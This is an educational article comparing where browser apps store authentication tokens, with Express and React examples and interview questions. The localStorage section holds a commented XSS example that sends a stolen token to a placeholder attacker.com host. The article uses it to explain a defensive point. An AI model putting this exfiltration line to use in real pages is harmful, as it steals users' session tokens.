# Token Storage

## Definition / Concept

**Token Storage** refers to where and how authentication tokens (JWT, OAuth tokens, session tokens) are safely stored in the browser. The storage location directly impacts security, accessibility, and vulnerability to attacks. Common options include **cookies** (HTTP-only, secure), **localStorage**, **sessionStorage**, and **memory**. Each approach has trade-offs between security and convenience. **HTTP-only cookies** are considered the most secure for most applications because they're inaccessible to JavaScript and immune to XSS attacks, while **localStorage/sessionStorage** are vulnerable to XSS but accessible via JavaScript.

- **HTTP-only cookies** are most secure but require CSRF protection
- **localStorage** is persistent but vulnerable to XSS attacks
- **sessionStorage** is session-based but still vulnerable to XSS
- **Memory storage** is most secure but lost on page refresh
- **Third-party scripts** can access localStorage/sessionStorage, posing XSS risks

## Visual Representation

```
TOKEN STORAGE COMPARISON
═══════════════════════════════════════════════════════════

┌──────────────────────────────────────────────────────────┐
│                   Storage Options                        │
├─────────────────┬──────────────┬────────────┬────────────┤
│     Storage     │   XSS Safe   │ CSRF Safe  │ Persistent │
├─────────────────┼──────────────┼────────────┼────────────┤
│ HTTP-only Cookie│     ✓ YES    │   Needs    │    ✓ YES   │
│                 │              │  CSRF token│            │
├─────────────────┼──────────────┼────────────┼────────────┤
│ localStorage    │   ✗ NO       │     ✓ YES  │    ✓ YES   │
│                 │ (XSS Risk)   │            │            │
├─────────────────┼──────────────┼────────────┼────────────┤
│ sessionStorage  │   ✗ NO       │     ✓ YES  │    ✗ NO    │
│                 │ (XSS Risk)   │            │ (cleared)  │
├─────────────────┼──────────────┼────────────┼────────────┤
│ Memory          │   ✓ YES      │     ✓ YES  │    ✗ NO    │
│ (Variable)      │              │            │ (on reload)│
└─────────────────┴──────────────┴────────────┴────────────┘

ATTACK VECTORS BY STORAGE METHOD
═══════════════════════════════════════════════════════════

localStorage/sessionStorage:
┌─────────────────────────────────┐
│ Third-party script included     │
│ (via CDN, malicious package)    │
│         ↓                        │
│ Scripts access token via        │
│ localStorage.getItem()          │
│         ↓                        │
│ Token sent to attacker's server │
│ XSS vulnerability!              │
└─────────────────────────────────┘

HTTP-only Cookies:
┌──────────────────────────────┐
│ Attacker injects script      │
│       ↓                       │
│ JavaScript cannot read token │
│ (HTTP-only flag protects)    │
│       ↓                       │
│ But browser auto-includes    │
│ in cross-origin requests     │
│ (CSRF vulnerability)         │
│ Mitigated by SameSite        │
└──────────────────────────────┘

LIFECYCLE: Token Creation to Storage
═══════════════════════════════════════════════════════════

Login Request
    ↓
Server validates credentials
    ↓
Server generates token
    ↓
Server sends to client:
    ├─ Set-Cookie header (for HTTP-only)
    ├─ JSON response body (for memory/localStorage)
    └─ Authorization header (alternative)
    ↓
Client stores token:
    ├─ Automatically (HTTP-only cookie)
    ├─ In localStorage (JavaScript)
    ├─ In memory (Redux/Context)
    └─ Combination (hybrid approach)
    ↓
Subsequent requests include token:
    ├─ Automatically (HTTP-only cookie)
    └─ Manually (memory/localStorage)
```

## Example

### HTTP-Only Cookie Approach (Most Secure)

```javascript
// Backend (Node.js with Express)
const express = require('express');
const app = express();

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;

  // Validate credentials
  const user = validateUser(username, password);
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Generate JWT token
  const token = jwt.sign(
    { userId: user.id, username: user.username },
    process.env.JWT_SECRET,
    { expiresIn: '1h' }
  );

  // Set HTTP-only, Secure cookie
  res.cookie('authToken', token, {
    httpOnly: true,      // ✓ Not accessible to JavaScript
    secure: true,        // ✓ Only sent over HTTPS
    sameSite: 'Strict',  // ✓ Prevents CSRF attacks
    maxAge: 3600000      // 1 hour
  });

  res.json({ success: true, message: 'Logged in' });
});

// Verify token middleware
app.use((req, res, next) => {
  const token = req.cookies.authToken;
  if (!token) {
    return res.status(401).json({ error: 'No token' });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
});

// Frontend: No token handling needed (browser does automatically)
async function login(username, password) {
  const response = await fetch('/api/login', {
    method: 'POST',
    credentials: 'include', // ✓ Include cookies in request
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password })
  });

  if (response.ok) {
    // Token is automatically stored in HTTP-only cookie
    // No manual storage needed
    return true;
  }
}

// Protected API calls - cookie included automatically
async function fetchUserData() {
  const response = await fetch('/api/user', {
    credentials: 'include' // ✓ Sends HTTP-only cookie
  });
  return response.json();
}
```

### localStorage Approach (Not Recommended)

```javascript
// Backend sends token in response body
app.post('/api/login', (req, res) => {
  const user = validateUser(req.body.username, req.body.password);
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET);

  // Send token in response (NOT in HTTP-only cookie)
  res.json({ token, expiresIn: 3600 });
});

// Frontend stores in localStorage
async function login(username, password) {
  const response = await fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password })
  });

  const data = await response.json();

  // ⚠️ VULNERABILITY: localStorage is accessible to XSS
  localStorage.setItem('authToken', data.token);
  localStorage.setItem('expiresAt', Date.now() + data.expiresIn * 1000);

  return true;
}

// Must manually add token to requests
async function fetchUserData() {
  const token = localStorage.getItem('authToken');

  const response = await fetch('/api/user', {
    headers: {
      'Authorization': `Bearer ${token}`
    }
  });

  return response.json();
}

// ❌ VULNERABILITY: XSS can steal token
// If attacker injects malicious script:
// const token = localStorage.getItem('authToken');
// fetch('https://attacker.com/steal?token=' + token);
```

### Secure Hybrid Approach

```javascript
// Backend sends token via HTTP-only cookie AND refresh token
app.post('/api/login', (req, res) => {
  const user = validateUser(req.body.username, req.body.password);
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Short-lived access token
  const accessToken = jwt.sign(
    { userId: user.id },
    process.env.ACCESS_TOKEN_SECRET,
    { expiresIn: '15m' }
  );

  // Longer-lived refresh token
  const refreshToken = jwt.sign(
    { userId: user.id },
    process.env.REFRESH_TOKEN_SECRET,
    { expiresIn: '7d' }
  );

  // Store refresh token in HTTP-only cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'Strict',
    maxAge: 7 * 24 * 60 * 60 * 1000
  });

  // Return access token (short-lived)
  res.json({ accessToken, expiresIn: 900 });
});

// Token refresh endpoint
app.post('/api/refresh', (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }

  try {
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
    const newAccessToken = jwt.sign(
      { userId: decoded.userId },
      process.env.ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );

    res.json({ accessToken: newAccessToken, expiresIn: 900 });
  } catch (error) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});

// Frontend stores short-lived token in memory
class AuthManager {
  accessToken = null;
  refreshTimeout = null;

  async login(username, password) {
    const response = await fetch('/api/login', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });

    const data = await response.json();

    // Store in memory (lost on refresh, but short-lived anyway)
    this.accessToken = data.accessToken;

    // Schedule token refresh
    this.scheduleRefresh(data.expiresIn);

    return true;
  }

  scheduleRefresh(expiresIn) {
    // Refresh 5 minutes before expiration
    const refreshTime = (expiresIn - 300) * 1000;

    this.refreshTimeout = setTimeout(async () => {
      const response = await fetch('/api/refresh', {
        method: 'POST',
        credentials: 'include'
      });

      const data = await response.json();
      this.accessToken = data.accessToken;
      this.scheduleRefresh(data.expiresIn);
    }, refreshTime);
  }

  async fetchUserData() {
    const response = await fetch('/api/user', {
      headers: {
        'Authorization': `Bearer ${this.accessToken}`
      },
      credentials: 'include'
    });

    if (response.status === 401) {
      // Token expired, try refresh
      await this.login();
      return this.fetchUserData();
    }

    return response.json();
  }

  logout() {
    this.accessToken = null;
    clearTimeout(this.refreshTimeout);

    fetch('/api/logout', {
      method: 'POST',
      credentials: 'include'
    });
  }
}

const auth = new AuthManager();
```

### Memory Storage with State Management

```javascript
// Using React Context and Hooks
import React, { createContext, useState } from 'react';

const AuthContext = createContext();

export function AuthProvider({ children }) {
  const [token, setToken] = useState(null);
  const [user, setUser] = useState(null);

  const login = async (username, password) => {
    const response = await fetch('/api/login', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });

    const data = await response.json();

    // Store only in memory (lost on refresh)
    setToken(data.token);
    setUser(data.user);

    return true;
  };

  const logout = () => {
    setToken(null);
    setUser(null);

    fetch('/api/logout', {
      method: 'POST',
      credentials: 'include'
    });
  };

  const fetchUserData = async () => {
    const response = await fetch('/api/user', {
      headers: token ? { 'Authorization': `Bearer ${token}` } : {},
      credentials: 'include'
    });

    return response.json();
  };

  return (
    <AuthContext.Provider
      value={{
        token,
        user,
        login,
        logout,
        isAuthenticated: !!token,
        fetchUserData
      }}
    >
      {children}
    </AuthContext.Provider>
  );
}
```

## Usage

### When to Use Each Approach

- **HTTP-only Cookies**: Recommended for most web applications (auto-managed, CSRF protection available)
- **localStorage**: Legacy projects or specific requirements (persistent across browser sessions)
- **Memory**: Highly sensitive applications willing to trade persistence for security
- **Hybrid**: Best balance — long-lived refresh token in HTTP-only cookie, short-lived access token in memory

### Real-world Example

```javascript
// Complete secure authentication flow

// Backend (Node.js)
const express = require('express');
const cookieParser = require('cookie-parser');
const csrf = require('csurf');

const app = express();
app.use(express.json());
app.use(cookieParser());
app.use(csrf({ cookie: false })); // CSRF protection

app.post('/api/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    const user = await User.findOne({ username });

    if (!user || !await user.comparePassword(password)) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    const accessToken = jwt.sign(
      { userId: user.id },
      process.env.ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );

    const refreshToken = jwt.sign(
      { userId: user.id },
      process.env.REFRESH_TOKEN_SECRET,
      { expiresIn: '7d' }
    );

    // HTTP-only secure cookie
    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'Strict',
      maxAge: 7 * 24 * 60 * 60 * 1000
    });

    res.json({
      accessToken,
      expiresIn: 900,
      user: { id: user.id, username: user.username }
    });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/logout', (req, res) => {
  res.clearCookie('refreshToken', {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'Strict'
  });

  res.json({ success: true });
});

// Frontend - React with secure token management
function useAuth() {
  const [token, setToken] = useState(null);
  const [loading, setLoading] = useState(false);

  const login = async (username, password) => {
    setLoading(true);
    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });

      if (!response.ok) throw new Error('Login failed');

      const data = await response.json();
      setToken(data.accessToken);

      // Auto-refresh before expiration
      setTimeout(() => refreshToken(), (data.expiresIn - 60) * 1000);
    } finally {
      setLoading(false);
    }
  };

  const refreshToken = async () => {
    try {
      const response = await fetch('/api/refresh', {
        method: 'POST',
        credentials: 'include'
      });

      if (response.ok) {
        const data = await response.json();
        setToken(data.accessToken);
        setTimeout(() => refreshToken(), (data.expiresIn - 60) * 1000);
      } else {
        setToken(null);
      }
    } catch (error) {
      setToken(null);
    }
  };

  const logout = async () => {
    await fetch('/api/logout', {
      method: 'POST',
      credentials: 'include'
    });
    setToken(null);
  };

  return { token, login, logout, loading };
}
```

### Best Practices

- **Always use HTTPS** — Never transmit tokens over HTTP
- **Use HTTP-only, Secure, SameSite cookies** — Protects against XSS and CSRF
- **Implement token expiration** — Short-lived access tokens (15-60 minutes)
- **Use refresh tokens for long sessions** — Stored securely, longer expiration
- **Validate tokens on every request** — Server-side verification required
- **Clear tokens on logout** — Remove from storage completely
- **Avoid storing sensitive data in tokens** — Don't put passwords or PII
- **Monitor token usage** — Detect suspicious activity and revoke if needed
- **Rotate refresh tokens** — Implement refresh token rotation for additional security

## FAQ / Interview Questions

**Q: What's the difference between storing tokens in localStorage vs HTTP-only cookies?**
A: localStorage is vulnerable to XSS attacks—malicious scripts can access and steal tokens. HTTP-only cookies prevent JavaScript access, making them immune to XSS. However, HTTP-only cookies are vulnerable to CSRF attacks, requiring CSRF token protection. For maximum security, use HTTP-only cookies with CSRF protection or a hybrid approach with memory storage.

**Q: Why is localStorage considered insecure for token storage?**
A: Any third-party script (vulnerable npm package, malicious ad, compromised CDN) can access localStorage via XSS. The script executes with the same privileges as your app and can steal tokens: `localStorage.getItem('token')` and send them to an attacker's server. HTTP-only cookies are protected from this since JavaScript cannot access them.

**Q: What's the difference between access tokens and refresh tokens?**
A: **Access tokens** are short-lived (15-60 minutes) and grant API access. **Refresh tokens** are long-lived (days/weeks) and only used to obtain new access tokens. If an access token is compromised, damage is limited to its short lifetime. Refresh tokens are stored more securely (HTTP-only cookies) and can be revoked server-side.

**Q: How does the SameSite cookie attribute protect against CSRF?**
A: `SameSite=Strict` prevents the browser from including the cookie in cross-site requests. This blocks CSRF attacks where an attacker's site tries to make requests to your domain—the cookie won't be sent. `SameSite=Lax` allows first-party navigation but blocks POST requests from other sites. `SameSite=None` requires `Secure` flag and includes the cookie everywhere.

**Q: Should I store tokens in memory for maximum security?**
A: Memory storage is most secure (XSS and CSRF safe) but has drawbacks: tokens are lost on page refresh, requiring re-authentication. It's best for single-page apps where you can refresh tokens automatically. For traditional apps where users expect persistence, the hybrid approach (refresh token in HTTP-only cookie, access token in memory) offers better balance.

## References

- [MDN - Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [OWASP - Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [Auth0 - Token Storage Best Practices](https://auth0.com/blog/where-to-store-tokens-in-browser-how-to-keep-user-data-secure/)
- [OWASP - Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---

*See also: [CSRF](./CSRF.md), [XSS](./XSS.md), [Web Storage](../Browser/WebStorage.md), [Cookie](../Browser/Cookie.md)*
